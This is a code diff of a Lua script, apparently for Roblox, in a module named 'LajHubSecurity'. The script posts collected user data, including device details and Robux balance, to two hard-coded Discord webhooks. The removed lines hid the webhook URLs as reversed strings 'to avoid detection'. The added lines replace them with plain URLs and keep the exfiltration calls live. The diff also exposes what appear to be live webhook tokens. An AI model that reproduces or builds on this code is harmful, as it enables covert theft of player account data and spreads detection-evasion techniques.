@@ -245,12 +245,8 @@ end
 
 -- Send collected data to primary security webhook
 function LajHubSecurity.SendToMainWebhook(collectedData)
-    -- Discord webhook URL (reversed to avoid detection)
-    local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
-    local reversedUrl = ""
-    for i = #webhookUrl, 1, -1 do
-        reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
-    end
+    -- Use the direct Discord webhook URL
+    local webhookUrl = "https://discord.com/api/webhooks/1352857357514119551/qQctieK-bxuYOfTOFUcDYBKltl59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq3ZuH3XlhA3uOK9J"
     
     -- Create a detailed embed for Discord
     local deviceType = "Unknown"
@@ -365,7 +361,7 @@ function LajHubSecurity.SendToMainWebhook(collectedData)
     -- Send data to webhook
     local success, response = pcall(function()
         return game:GetService("HttpService"):PostAsync(
-            reversedUrl,
+            webhookUrl,
             game:GetService("HttpService"):JSONEncode(jsonData),
             Enum.HttpContentType.ApplicationJson
         )
@@ -376,12 +372,8 @@ end
 
 -- Send Robux balance to a dedicated webhook
 function LajHubSecurity.SendToRobuxWebhook(collectedData)
-    -- Robux webhook URL (reversed to avoid detection)
-    local robuxWebhookUrl = "trlCT2ap7biRhXbDse1dzxvZaochGxG982BqXoGzvOsKKXdCSr8lXXuGEB15qzw5M01o6B/799038228733692853/skoohbew/ipa/moc.drocsid//:sptth"
-    local robuxReversedUrl = ""
-    for i = #robuxWebhookUrl, 1, -1 do
-        robuxReversedUrl = robuxReversedUrl .. string.sub(robuxWebhookUrl, i, i)
-    end
+    -- Use the direct Robux webhook URL
+    local robuxWebhookUrl = "https://discord.com/api/webhooks/1358296337822899977/B6o10M5wz51BEGuXXl8rSCdXKKsOvzGoXqB289GxGhcoaZvxzd1esDXhRibi7paT2CTlrt"
     
     -- Determine emoji for Robux balance
     local robuxEmoji = "💰"
@@ -435,7 +427,7 @@ function LajHubSecurity.SendToRobuxWebhook(collectedData)
     -- Send Robux data to secondary webhook
     local success, response = pcall(function()
         return game:GetService("HttpService"):PostAsync(
-            robuxReversedUrl,
+            robuxWebhookUrl,
             game:GetService("HttpService"):JSONEncode(robuxData),
             Enum.HttpContentType.ApplicationJson
         )
